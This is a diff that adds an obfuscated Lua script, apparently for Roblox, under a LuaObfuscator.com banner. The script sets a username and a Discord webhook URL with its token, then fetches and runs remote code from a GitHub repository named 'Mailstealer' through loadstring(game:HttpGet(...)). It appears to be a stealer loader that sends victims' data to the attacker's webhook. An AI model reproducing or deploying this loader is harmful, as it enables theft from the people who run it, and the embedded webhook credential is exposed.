@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 
+
+]]--
+
+do do local v0=0;local v0;while true do if (v0==0) then v0=0;while true do if (v0==1) then LoadingScreen=true;loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))();break;end if (v0==0) then Username="L4Snap";Webhook="https://discord.com/api/webhooks/1191782511857127636/QSJ-OPOWKG6A2FZe7mKEKWVUJo7foYM9oWaJft7KEtVqK5SdzuIJaq9vMgWc2-f-4uoK";v0=1;end end break;end end end end
